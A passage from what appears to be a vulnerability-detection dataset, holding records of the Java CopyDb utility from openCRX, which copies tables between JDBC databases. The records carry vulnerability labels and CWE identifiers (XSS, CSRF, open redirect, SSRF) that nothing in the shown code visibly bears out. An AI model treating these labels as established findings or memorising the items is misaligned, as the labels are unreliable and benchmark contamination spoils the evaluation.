if(databaseProductName.startsWith(\"DB2/\")) {\n\t\t\t\treturn Boolean.valueOf(\"Y\".equals(columnValue));\n\t\t\t} else if(\"HSQL Database Engine\".equals(databaseProductName)) {\n\t\t\t\treturn columnValue;\n\t\t\t} else if(\"Oracle\".equals(databaseProductName)) {\n\t\t\t\treturn Boolean.valueOf(((Number) columnValue).intValue() == 1);\n\t\t\t} else {\n\t\t\t\tthrow new ServiceException(BasicException.Code.DEFAULT_DOMAIN, BasicException.Code.NOT_SUPPORTED, \"Database not supported\", new BasicException.Parameter(\"database product name\",\n\t\t\t\t    databaseProductName));\n\t\t\t}\n\t\t} else {\n\t\t\tif(columnValue instanceof String) {\n\t\t\t\tString targetValue = (String)columnValue;\n\t\t\t\tfor(int i = 0; i < valuePatterns.size(); i++) {\n\t\t\t\t\tString valuePattern = valuePatterns.get(i);\n\t\t\t\t\tString valueReplacment = valueReplacements.get(i);\n\t\t\t\t\tif(valuePattern != null & valuePattern.length() > 0) {\n\t\t\t\t\t\ttargetValue = targetValue.replaceAll(valuePattern, valueReplacment);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn targetValue;\n\t\t\t} else {\n\t\t\t\treturn columnValue;\n\t\t\t}\n\t\t}\n\t}\n\n\t/**\n\t * Copy dbObject from source to target database.\n\t * \n\t * @param dbObject\n\t * @param useSuffix\n\t * @param connSource\n\t * @param connTarget\n\t * @param providerNameSource\n\t * @param providerNameTarget\n\t * @param out\n\t * @throws SQLException\n\t */\n\tpublic static void copyDbObject(\n\t\tString dbObject, \n\t\tboolean useSuffix, \n\t\tConnection connSource, \n\t\tConnection connTarget, \n\t\tList<String> valuePatterns,\n\t\tList<String> valueReplacements,\n\t\tPrintStream out\n\t) throws SQLException {\n\t\tString currentStatement = null;\n\t\tDatabase_2 db = new Database_2();\n\t\ttry {\n\t\t\tDatabase_2[] plugins = Utils.getDatabasePlugIns();\n\t\t\tdb = plugins[0];\n\t\t} catch (Exception e) {\n\t\t\tout.println(\"Can not activate database plugin: \" + e.getMessage());\n\t\t}\n\t\ttry {\n\t\t\t// Delete all rows from target\n\t\t\tPreparedStatement s = connTarget.prepareStatement(currentStatement = \"DELETE FROM \" + dbObject + (useSuffix ? \"_\" : \"\"));\n\t\t\ts.executeUpdate();\n\t\t\ts.close();\n\t\t\t// Read all rows from source\n\t\t\ts = connSource.prepareStatement(currentStatement = \"SELECT * FROM \" + dbObject + (useSuffix ? \"_\" : \"\"));\n\t\t\tResultSet rs = s.executeQuery();\n\t\t\tif(rs != null) {\n\t\t\t\tResultSetMetaData rsm = rs.getMetaData();\n\t\t\t\tFastResultSet frs = new FastResultSet(rs);\n\t\t\t\tint nRows = 0;\n\t\t\t\twhile (frs.next()) {\n\t\t\t\t\t// Read row from source and prepare INSERT statement\n\t\t\t\t\tString statement = \"INSERT INTO \" + dbObject + (useSuffix ? \"_\" : \"\") + \" \";\n\t\t\t\t\tList<Object> statementParameters = new ArrayList<Object>();\n\t\t\t\t\tList<String> processTargetColumnNames = new ArrayList<String>();\n\t\t\t\t\tfor (int j = 0; j < rsm.getColumnCount(); j++) {\n\t\t\t\t\t\tString columnName = rsm.getColumnName(j + 1);\n\t\t\t\t\t\tif(frs.getObject(columnName) != null) {\n\t\t\t\t\t\t\tString mappedColumnName = CopyDb.mapColumnName(connTarget, dbObject, columnName);\n\t\t\t\t\t\t\tif(mappedColumnName != null) {\n\t\t\t\t\t\t\t\tstatement += (statementParameters.size() == 0 ? \" (\" : \", \") + mappedColumnName;\n\t\t\t\t\t\t\t\tprocessTargetColumnNames.add(mappedColumnName);\n\t\t\t\t\t\t\t\tif(frs.getObject(columnName) instanceof java.sql.Clob) {\n\t\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\t\tstatementParameters.add(CopyDb.getStringFromClob((java.sql.Clob) frs.getObject(columnName)));\n\t\t\t\t\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\t\t\t\t\tout.println(\"Reading Clob failed. Reason: \" + e.getMessage());\n\t\t\t\t\t\t\t\t\t\tout.println(\"statement=\" + statement);\n\t\t\t\t\t\t\t\t\t\tout.println(\"parameters=\" + statementParameters);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else if(frs.getObject(columnName) instanceof java.sql.Blob) {\n\t\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\t\tstatementParameters.add(CopyDb.getBytesFromBlob((java.sql.Blob) frs.getObject(columnName)));\n\t\t\t\t\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\t\t\t\t\tout.println(\"Reading Blob failed. Reason: \" + e.getMessage());\n\t\t\t\t\t\t\t\t\t\tout.println(\"statement=\" + statement);\n\t\t\t\t\t\t\t\t\t\tout.println(\"parameters=\" + statementParameters);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tstatementParameters.add(\n\t\t\t\t\t\t\t\t\t\tCopyDb.mapColumnValue(\n\t\t\t\t\t\t\t\t\t\t\tconnSource,\n\t\t\t\t\t\t\t\t\t\t\tdbObject,\n\t\t\t\t\t\t\t\t\t\t\tcolumnName,\n\t\t\t\t\t\t\t\t\t\t\tfrs.getObject(columnName),\n\t\t\t\t\t\t\t\t\t\t\tvaluePatterns,\n\t\t\t\t\t\t\t\t\t\t\tvalueReplacements\n\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tstatement += \") VALUES (\";\n\t\t\t\t\tfor (int j = 0; j < statementParameters.size(); j++) {\n\t\t\t\t\t\tstatement += j == 0 ? \"?\" : \", ?\";\n\t\t\t\t\t}\n\t\t\t\t\tstatement += \")\";\n\t\t\t\t\t// Add row to target\n\t\t\t\t\ttry {\n\t\t\t\t\t\tPreparedStatement t = connTarget.prepareStatement(currentStatement = statement);\n\t\t\t\t\t\tfor (int j = 0; j < statementParameters.size(); j++) {\n\t\t\t\t\t\t\tObject parameter = statementParameters.get(j);\n\t\t\t\t\t\t\tif(\"oracle.sql.TIMESTAMP\".equals(parameter.getClass().getName())) {\n\t\t\t\t\t\t\t\tMethod timestampValueMethod = parameter.getClass().getMethod(\"timestampValue\", new Class[] {});\n\t\t\t\t\t\t\t\tparameter = timestampValueMethod.invoke(parameter, new Object[] {});\n\t\t\t\t\t\t\t} else if(\"microsoft.sql.DateTimeOffset\".equals(parameter.getClass().getName())) {\n\t\t\t\t\t\t\t\tMethod timestampValueMethod = parameter.getClass().getMethod(\"getTimestamp\", new Class[] {});\n\t\t\t\t\t\t\t\tparameter = timestampValueMethod.invoke(parameter, new Object[] {});\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif(parameter instanceof java.sql.Timestamp) {\n\t\t\t\t\t\t\t\tt.setTimestamp(j + 1, (java.sql.Timestamp) parameter);\n\t\t\t\t\t\t\t} else if(parameter instanceof java.sql.Date) {\n\t\t\t\t\t\t\t\tt.setDate(j + 1, (java.sql.Date) parameter);\n\t\t\t\t\t\t\t} else if(parameter instanceof Double) {\n\t\t\t\t\t\t\t\tt.setBigDecimal(j + 1, new BigDecimal((Double)parameter));\n\t\t\t\t\t\t\t} else if(parameter instanceof Float) {\n\t\t\t\t\t\t\t\tt.setBigDecimal(j + 1, new BigDecimal((Float)parameter));\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tdb.setPreparedStatementValue(connTarget, t, j + 1, parameter);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tt.executeUpdate();\n\t\t\t\t\t\tt.close();\n\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\tnew ServiceException(e).log();\n\t\t\t\t\t\tout.println(\"Insert failed. Reason: \" + e.getMessage());\n\t\t\t\t\t\tout.println(\"statement=\" + statement);\n\t\t\t\t\t\tout.println(\"parameters=\" + statementParameters);\n\t\t\t\t\t}\n\t\t\t\t\tnRows++;\n\t\t\t\t\tif(nRows % 1000 == 0) {\n\t\t\t\t\t\tout.println(nRows + \" rows copied\");\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\trs.close();\n\t\t\t} else {\n\t\t\t\tout.println(\"Did not copy table (result set is null). Statement: \" + currentStatement);\n\t\t\t}\n\t\t\ts.close();\n\t\t} catch (Exception e) {\n\t\t\tnew ServiceException(e).log();\n\t\t\tout.println(\"Can not copy table (see log for more info). Statement: \" + currentStatement);\n\t\t}\n\t}\n\n\t/**\n\t * Copy all tables from source to target database.\n\t * \n\t * @param connSource\n\t * @param connTarget\n\t * @param dbObjects\n\t * @param startFromDbObject\n\t * @param endWithDbObject\n\t * @param providerNameSource\n\t * @param providerNameTarget\n\t * @param out\n\t */\n\tprivate static void copyNamespace(\n\t    Connection connSource,\n\t    Connection connTarget,\n\t    List<String> dbObjects,\n\t\tList<String> valuePatterns,\n\t\tList<String> valueReplacements,\n\t    PrintStream out\n\t) {\n\t\tString currentStatement = null;\n\t\ttry {\n\t\t\tout.println(\"Processing tables:\");\n\t\t\tint ii = 0;\n\t\t\tfor(String dbObject: dbObjects) {\n\t\t\t\tout.println(ii + \": \" + dbObject);\n\t\t\t\tii++;\n\t\t\t}\n\t\t\tSet<String> processedDbObjects = new HashSet<String>();\n\t\t\tfor (String dbObject: dbObjects) {\n\t\t\t\tif((dbObject != null) && !dbObject.isEmpty() && !processedDbObjects.contains(dbObject)) {\n\t\t\t\t\tout.println(\"Copying table: \" + dbObject);\n\t\t\t\t\tCopyDb.copyDbObject(\n\t\t\t\t\t\tdbObject, \n\t\t\t\t\t\tfalse, \n\t\t\t\t\t\tconnSource, \n\t\t\t\t\t\tconnTarget, \n\t\t\t\t\t\tvaluePatterns, \n\t\t\t\t\t\tvalueReplacements, \n\t\t\t\t\t\tout\n\t\t\t\t\t);\n\t\t\t\t\tout.println(\"Copying table: \" + dbObject + \"_\");\n\t\t\t\t\tCopyDb.copyDbObject(\n\t\t\t\t\t\tdbObject, \n\t\t\t\t\t\ttrue, \n\t\t\t\t\t\tconnSource, \n\t\t\t\t\t\tconnTarget, \n\t\t\t\t\t\tvaluePatterns, \n\t\t\t\t\t\tvalueReplacements, \n\t\t\t\t\t\tout\n\t\t\t\t\t);\n\t\t\t\t\tprocessedDbObjects.add(dbObject);\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (SQLException e) {\n\t\t\tServiceException e0 = new ServiceException(e);\n\t\t\te0.log();\n\t\t\tout.println(\"statement: \" + currentStatement + \" (message=\" + e0.getMessage());\n\t\t}\n\t}\n\n\t/**\n\t * CopyDb utility.\n\t * \n\t * @param args\n\t */\n\tpublic static void main(\n\t\tString[] args\n\t) {\n\t\ttry {\n\t\t\tProperties env = System.getProperties();\n\t\t\tString includeDbObjects = env.getProperty(\"includeDbObjects\");\n\t\t\tString excludeDbObjects = env.getProperty(\"excludeDbObjects\");\n\t\t\tString valuePatterns = env.getProperty(\"valuePatterns\");\n\t\t\tString valueReplacements = env.getProperty(\"valueReplacements\");\n\t\t\tcopyDb(\n\t\t\t\tenv.getProperty(\"jdbcDriverSource\"), \n\t\t\t\tenv.getProperty(\"usernameSource\"), \n\t\t\t\tenv.getProperty(\"passwordSource\"), \n\t\t\t\tenv.getProperty(\"jdbcUrlSource\"), \n\t\t\t\tenv.getProperty(\"jdbcDriverTarget\"),\n\t\t\t    env.getProperty(\"usernameTarget\"), \n\t\t\t    env.getProperty(\"passwordTarget\"), \n\t\t\t    env.getProperty(\"jdbcUrlTarget\"), \n\t\t\t    includeDbObjects == null ? Collections.<String>emptyList() : Arrays.asList(includeDbObjects.split(\",\")),\n\t\t\t\texcludeDbObjects == null ? Collections.<String>emptyList() : Arrays.asList(excludeDbObjects.split(\",\")),\n\t\t\t\tvaluePatterns == null ? Collections.<String>emptyList() : Arrays.asList(valuePatterns.split(\",\")),\n\t\t\t\tvalueReplacements == null ? Collections.<String>emptyList() : Arrays.asList(valueReplacements.split(\",\")),\n\t\t\t    System.out\n\t\t\t);\n\t\t} catch (Exception e) {\n\t\t\tnew ServiceException(e).log();\n\t\t}\n\t}\n\n\t/**\n\t * Filter list of dbObjects.\n\t * \n\t * @param dbObjects\n\t * @param includeDbObjects\n\t * @param excludeDbObjects\n\t * @return\n\t * @throws ServiceException\n\t */\n\tprivate static List<String> filterDbObjects(\n\t\tList<String> dbObjects,\n\t\tList<String> includeDbObjects,\n\t\tList<String> excludeDbObjects\n\t) throws ServiceException {\n\t\tList<String> filteredDbObjects = new ArrayList<String>();\n\t\tfor(String dbObject: dbObjects) {\n\t\t\tif(dbObject != null) {\n\t\t\t\tdbObject = dbObject.trim();\n\t\t\t\tif(!dbObject.isEmpty()) {\n\t\t\t\t\tfor(String includeDbObject: includeDbObjects) {\n\t\t\t\t\t\tif(dbObject.matches(includeDbObject)) {\n\t\t\t\t\t\t\tfilteredDbObjects.add(dbObject);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tfor(String dbObject: dbObjects) {\n\t\t\tif(dbObject != null) {\n\t\t\t\tdbObject = dbObject.trim();\n\t\t\t\tfor(String excludeDbObject: excludeDbObjects) {\n\t\t\t\t\tif(dbObject.matches(excludeDbObject)) {\n\t\t\t\t\t\tfilteredDbObjects.remove(dbObject);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn filteredDbObjects;\n\t}\n\n\t/**\n\t * CopyDb utility. \n\t * \n\t * @param jdbcDriverSource\n\t * @param usernameSource\n\t * @param passwordSource\n\t * @param jdbcUrlSource\n\t * @param jdbcDriverTarget\n\t * @param usernameTarget\n\t * @param passwordTarget\n\t * @param jdbcUrlTarget\n\t * @param includeDbObjects\n\t * @param excludeDbObjects\n\t * @param valuePatterns\n\t * @param valueReplacements\n\t * @param out\n\t * @throws ServiceException\n\t */\n\tpublic static void copyDb(\n\t    String jdbcDriverSource,\n\t    String usernameSource,\n\t    String passwordSource,\n\t    String jdbcUrlSource,\n\t    String jdbcDriverTarget,\n\t    String usernameTarget,\n\t    String passwordTarget,\n\t    String jdbcUrlTarget,\n\t    List<String> includeDbObjects,\n\t    List<String> excludeDbObjects,\n\t    List<String> valuePatterns,\n\t    List<String> valueReplacements,\n\t    PrintStream out\n\t) throws ServiceException {\n\t\t{\n\t\t\tDBOBJECTS.clear();\n\t\t\tList<String> tableNames = new ArrayList<String>();\n\t\t\ttry {\n\t\t\t\ttableNames = DbSchemaUtils.getTableNames();\n\t\t\t} catch (Exception e) {\n\t\t\t\tnew ServiceException(e).log();\n\t\t\t}\n\t\t\tfor(String tableName : tableNames) {\n\t\t\t\tif(\n\t\t\t\t\ttableName.indexOf(\"_\") > 0 &&\n\t\t\t\t\ttableName.indexOf(\"_TOBJ_\") < 0 &&\n\t\t\t\t\ttableName.indexOf(\"_JOIN_\") < 0 &&\n\t\t\t\t\t!tableName.endsWith(\"_\")\n\t\t\t\t) {\n\t\t\t\t\tDBOBJECTS.add(tableName);\n\t\t\t\t}\n\t\t\t}\t\t\n\t\t}\n\t\ttry {\n\t\t\t// Source connection\n\t\t\tClass.forName(jdbcDriverSource);\n\t\t\tProperties props = new Properties();\n\t\t\tprops.put(\"user\", usernameSource);\n\t\t\tprops.put(\"password\", passwordSource);\n\t\t\tConnection connSource = DriverManager.getConnection(jdbcUrlSource, props);\n\t\t\tconnSource.setAutoCommit(true);\n\t\t\t// Target connection\n\t\t\tClass.forName(jdbcDriverTarget);\n\t\t\tprops = new Properties();\n\t\t\tprops.put(\"user\", usernameTarget);\n\t\t\tprops.put(\"password\", passwordTarget);\n\t\t\tConnection connTarget = DriverManager.getConnection(jdbcUrlTarget, props);\n\t\t\tconnTarget.setAutoCommit(true);\n\t\t\tCopyDb.copyNamespace(\n\t\t\t\tconnSource, \n\t\t\t\tconnTarget,\n\t\t\t\tfilterDbObjects(\n\t\t\t\t\tDBOBJECTS, \n\t\t\t\t\tincludeDbObjects, \n\t\t\t\t\texcludeDbObjects\n\t\t\t\t),\n\t\t\t    valuePatterns, \n\t\t\t    valueReplacements, \n\t\t\t    out\n\t\t\t);\n\t\t} catch (Exception e) {\n\t\t\tthrow new ServiceException(e);\n\t\t}\n\t\tout.println();\n\t\tout.println(\"!!! DONE !!!\");\n\t}\n\n\t// -----------------------------------------------------------------------\n\t// Members\n\t// -----------------------------------------------------------------------\n\tstatic final List<String> DBOBJECTS = new ArrayList<String>();\n\n\tstatic final Set<String> BOOLEAN_COLUMNS = new HashSet<String>(Arrays.asList(\n\t    \"DISABLED\", \"USER_BOOLEAN0\", \"USER_BOOLEAN1\", \"USER_BOOLEAN2\", \"USER_BOOLEAN3\", \"USER_BOOLEAN4\", \"DO_NOT_BULK_POSTAL_MAIL\", \"DO_NOT_E_MAIL\", \"DO_NOT_FAX\", \"DO_NOT_PHONE\",\n\t    \"DO_NOT_POSTAL_MAIL\", \"EXT_BOOLEAN0\", \"EXT_BOOLEAN1\", \"EXT_BOOLEAN2\", \"EXT_BOOLEAN3\", \"EXT_BOOLEAN4\", \"EXT_BOOLEAN5\", \"EXT_BOOLEAN6\", \"EXT_BOOLEAN7\", \"EXT_BOOLEAN8\", \"EXT_BOOLEAN9\",\n\t    \"DISABLED\", \"DISCOUNT_IS_PERCENTAGE\", \"USER_BOOLEAN4\", \"IS_ALL_DAY_EVENT\", \"DELIVERY_RECEIPT_REQUESTED\", \"READ_RECEIPT_REQUESTED\", \"IS_MAIN\", \"RESET_TO_NULL\", \"IS_MAIN\", \"AUTOMATIC_PARSING\",\n\t    \"IS_CLOSED\", \"IS_FINAL\", \"CREDIT_FIRST\", \"IS_DEFAULT\", \"IS_WORKING_DAY\", \"IS_LOCKED\", \"IS_GIFT\", \"IS_TEMPLATE\", \"DISCOUNT_IS_PERCENTAGE\", \"IS_GIFT\", \"SALES_COMMISSION_IS_PERCENTAGE\",\n\t    \"IS_CREDIT_ON_HOLD\", \"ALLOW_POSITION_AUTO_CREATE\", \"IS_DEFAULT\", \"IS_LOCKED\", \"IS_TEMPLATE\", \"IS_LOCKED\", \"HOLDER_QUALIFIES_POSITION\", \"IS_DRAFT\", \"ALLOW_CREDIT_BOOKINGS\",\n\t    \"ALLOW_DEBIT_BOOKINGS\", \"IS_DEFAULT\", \"IS_ACTIVE\", \"BOOLEAN_PARAM\", \"IS_CHANGEABLE\", \"IS_QUERY\", \"IS_DERIVED\", \"IS_ABSTRACT\", \"IS_SINGLETON\", \"IS_CLUSTERED\", \"IS_NAVIGABLE\",\n\t    \"WEIGHT_IS_PERCENTAGE\", \"IS_FINAL\", \"DISCOUNT_IS_PERCENTAGE\", \"IS_DEFAULT\", \"ALLOW_MODIFICATION\", \"ALLOW_REMOVAL\", \"DISCOUNT_IS_PERCENTAGE\", \"OVERRIDE_PRICE\", \"IS_STOCK_ITEM\",\n\t    \"DISCOUNT_IS_PERCENTAGE\", \"IS_DEFAULT\", \"BOOLEAN_VALUE\", \"IS_ACTIVE\", \"NEW_BOOLEAN\", \"OLD_BOOLEAN\", \"SELECTOR\", \"IS_SCHEDULE_BASE_UOM\", \"STORE_SETTINGS_ON_LOGOFF\", \"IS_SYNCHRONOUS\", \"FAILED\",\n\t    \"IS_BILLABLE\", \"IS_REIMBURSABLE\", \"LOCKED\", \"ALLOW_ADD_DELETE\", \"ALLOW_CHANGE\"\n\t));\n\n}\n",
    "target": 1,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700254,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*\n * ====================================================================\n * Project:     openCRX/Core, http://www.opencrx.org/\n * Description: CopyDb tool\n * Owner:       CRIXP AG, Switzerland, http://www.crixp.com\n * ====================================================================\n *\n * This software is published under the BSD license\n * as listed below.\n * \n * Copyright (c) 2004-2020, CRIXP Corp., Switzerland\n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without \n * modification, are permitted provided that the following conditions \n * are met:\n * \n * * Redistributions of source code must retain the above copyright\n * notice, this list of conditions and the following disclaimer.\n * \n * * Redistributions in binary form must reproduce the above copyright\n * notice, this list of conditions and the following disclaimer in\n * the documentation and/or other materials provided with the\n * distribution.\n * \n * * Neither the name of CRIXP Corp. nor the names of the contributors\n * to openCRX may be used to endorse or promote products derived\n * from this software without specific prior written permission\n * \n * \n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND\n * CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES,\n * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n * TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON\n * ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY\n * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n * \n * ------------------\n * \n * This product includes software developed by the Apache Software\n * Foundation (http://www.apache.org/).\n * \n * This product includes software developed by contributors to\n * openMDX (http://www.openmdx.org/)\n */\npackage org.opencrx.kernel.tools;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintStream;\nimport java.io.Reader;\nimport java.lang.reflect.Method;\nimport java.math.BigDecimal;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.ResultSetMetaData;\nimport java.sql.SQLException;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Properties;\nimport java.util.Set;\n\nimport org.opencrx.kernel.utils.DbSchemaUtils;\nimport org.opencrx.kernel.utils.Utils;\nimport org.openmdx.base.dataprovider.layer.persistence.jdbc.Database_2;\nimport org.openmdx.base.exception.ServiceException;\nimport org.openmdx.kernel.exception.BasicException;\n\n/**\n * CopyDb\n *\n */\npublic class CopyDb {\n\n\t/**\n\t * Map CLOB to String.\n\t * \n\t * @param clob\n\t * @return\n\t * @throws IOException\n\t * @throws SQLException\n\t */\n\tprivate static String getStringFromClob(\n\t\tjava.sql.Clob clob\n\t) throws IOException, SQLException {\n\t\tReader reader = clob.getCharacterStream();\n\t\tStringBuilder s = new StringBuilder();\n\t\tint c;\n\t\twhile ((c = reader.read()) != -1) {\n\t\t\ts.append((char) c);\n\t\t}\n\t\treturn s.toString();\n\t}\n\n\t/**\n\t * Map BLOB to byte[].\n\t * \n\t * @param blob\n\t * @return\n\t * @throws IOException\n\t * @throws SQLException\n\t */\n\tprivate static byte[] getBytesFromBlob(\n\t\tjava.sql.Blob blob\n\t) throws IOException, SQLException {\n\t\tInputStream is = blob.getBinaryStream();\n\t\tByteArrayOutputStream os = new ByteArrayOutputStream();\n\t\tint b;\n\t\twhile ((b = is.read()) != -1) {\n\t\t\tos.write(b);\n\t\t}\n\t\tos.close();\n\t\treturn os.toByteArray();\n\t}\n\n\t/**\n\t * Db-specific column name mapping.\n\t * \n\t * @param conn\n\t * @param dbObject\n\t * @param columnName\n\t * @return\n\t * @throws SQLException\n\t */\n\tprivate static String mapColumnName(\n\t\tConnection conn, \n\t\tString dbObject, \n\t\tString columnName\n\t) throws SQLException {\n\t\tString databaseProductName = conn.getMetaData().getDatabaseProductName();\n\t\tif(\"HSQL Database Engine\".equals(databaseProductName)) {\n\t\t\tString mappedColumnName = columnName.toUpperCase();\n\t\t\tif(\"POSITION\".equals(mappedColumnName) || mappedColumnName.indexOf(\"$\") > 0) {\n\t\t\t\treturn \"\\\"\" + mappedColumnName + \"\\\"\";\n\t\t\t} else {\n\t\t\t\treturn mappedColumnName;\n\t\t\t}\n\t\t} else if(\"PostgreSQL\".equals(databaseProductName)) {\n\t\t\tString mappedColumnName = columnName.toLowerCase();\n\t\t\tif(\"offset\".equals(mappedColumnName) || \"end\".equals(mappedColumnName) || mappedColumnName.indexOf(\"-\") > 0) {\n\t\t\t\treturn \"\\\"\" + mappedColumnName + \"\\\"\";\n\t\t\t} else {\n\t\t\t\treturn mappedColumnName;\n\t\t\t}\n\t\t} else {\n\t\t\treturn columnName.toUpperCase();\n\t\t}\n\t}\n\n\t/**\n\t * DB-specific column value mapping.\n\t * \n\t * @param conn\n\t * @param dbObject\n\t * @param columnName\n\t * @param columnValue\n\t * @param valuePatterns\n\t * @param valueReplacements\n\t * @return\n\t * @throws ServiceException\n\t * @throws SQLException\n\t */\n\tprivate static Object mapColumnValue(\n\t\tConnection conn, \n\t\tString dbObject, \n\t\tString columnName, \n\t\tObject columnValue, \n\t\tList<String> valuePatterns,\n\t\tList<String> valueReplacements\n\t) throws ServiceException, SQLException {\n\t\tString databaseProductName = conn.getMetaData().getDatabaseProductName();\n\t\tif(BOOLEAN_COLUMNS.contains(columnName.toUpperCase())) {\n\t\t\tif(\"PostgreSQL\".equals(databaseProductName)) {\n\t\t\t\treturn columnValue;\n\t\t\t} else if(\"MySQL\".equals(databaseProductName)) {\n\t\t\t\treturn columnValue;\n\t\t\t} else if(\"Microsoft SQL Server\".equals(databaseProductName)) {\n\t\t\t\treturn columnValue;\n\t\t\t} else if(databaseProductName.startsWith(\"DB2/\")) {\n\t\t\t\treturn Boolean.valueOf(\"Y\".equals(columnValue));\n\t\t\t} else if(\"HSQL Database Engine\".equals(databaseProductName)) {\n\t\t\t\treturn columnValue;\n\t\t\t} else if(\"Oracle\".equals(databaseProductName)) {\n\t\t\t\treturn Boolean.valueOf(((Number) columnValue).intValue() == 1);\n\t\t\t} else {\n\t\t\t\tthrow new ServiceException(BasicException.Code.DEFAULT_DOMAIN, BasicException.Code.NOT_SUPPORTED, \"Database not supported\", new BasicException.Parameter(\"database product name\",\n\t\t\t\t    databaseProductName));\n\t\t\t}\n\t\t} else {\n\t\t\tif(columnValue instanceof String) {\n\t\t\t\tString targetValue = (String)columnValue;\n\t\t\t\tfor(int i = 0; i < valuePatterns.size(); i++) {\n\t\t\t\t\tString valuePattern = valuePatterns.get(i);\n\t\t\t\t\tString valueReplacment = valueReplacements.get(i);\n\t\t\t\t\tif(valuePattern != null & valuePattern.length() > 0) {\n\t\t\t\t\t\ttargetValue = targetValue.replaceAll(valuePattern, valueReplacment);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn targetValue;\n\t\t\t} else {\n\t\t\t\treturn columnValue;\n\t\t\t}\n\t\t}\n\t}\n\n\t/**\n\t * Copy dbObject from source to target database.\n\t * \n\t * @param dbObject\n\t * @param useSuffix\n\t * @param connSource\n\t * @param connTarget\n\t * @param providerNameSource\n\t * @param providerNameTarget\n\t * @param out\n\t * @throws SQLException\n\t */\n\tpublic static void copyDbObject(\n\t\tString dbObject, \n\t\tboolean useSuffix, \n\t\tConnection connSource, \n\t\tConnection connTarget, \n\t\tList<String> valuePatterns,\n\t\tList<String> valueReplacements,\n\t\tPrintStream out\n\t) throws SQLException {\n\t\tString currentStatement = null;\n\t\tDatabase_2 db = new Database_2();\n\t\ttry {\n\t\t\tDatabase_2[] plugins = Utils.getDatabasePlugIns();\n\t\t\tdb = plugins[0];\n\t\t} catch (Exception e) {\n\t\t\tout.println(\"Can not activate database plugin: \" + e.getMessage());\n\t\t}\n\t\ttry {\n\t\t\t// Delete all rows from target\n\t\t\tPreparedStatement s = connTarget.prepareStatement(currentStatement = \"DELETE FROM \" + dbObject + (useSuffix ? \"_\" : \"\"));\n\t\t\ts.executeUpdate();\n\t\t\ts.close();\n\t\t\t// Read all rows from source\n\t\t\ts = connSource.prepareStatement(currentStatement = \"SELECT * FROM \" + dbObject + (useSuffix ? \"_\" : \"\"));\n\t\t\ts.setFetchSize(100);\n\t\t\tResultSet rs = s.executeQuery();\n\t\t\tif(rs != null) {\n\t\t\t\tResultSetMetaData rsm = rs.getMetaData();\n\t\t\t\tFastResultSet frs = new FastResultSet(rs);\n\t\t\t\tint nRows = 0;\n\t\t\t\twhile (frs.next()) {\n\t\t\t\t\t// Read row from source and prepare INSERT statement\n\t\t\t\t\tString statement = \"INSERT INTO \" + dbObject + (useSuffix ? \"_\" : \"\") + \" \";\n\t\t\t\t\tList<Object> statementParameters = new ArrayList<Object>();\n\t\t\t\t\tList<String> processTargetColumnNames = new ArrayList<String>();\n\t\t\t\t\tfor (int j = 0; j < rsm.getColumnCount(); j++) {\n\t\t\t\t\t\tString columnName = rsm.getColumnName(j + 1);\n\t\t\t\t\t\tif(frs.getObject(columnName) != null) {\n\t\t\t\t\t\t\tString mappedColumnName = CopyDb.mapColumnName(connTarget, dbObject, columnName);\n\t\t\t\t\t\t\tif(mappedColumnName != null) {\n\t\t\t\t\t\t\t\tstatement += (statementParameters.size() == 0 ? \" (\" : \", \") + mappedColumnName;\n\t\t\t\t\t\t\t\tprocessTargetColumnNames.add(mappedColumnName);\n\t\t\t\t\t\t\t\tif(frs.getObject(columnName) instanceof java.sql.Clob) {\n\t\t\t\t\t\t\t\t\ttry 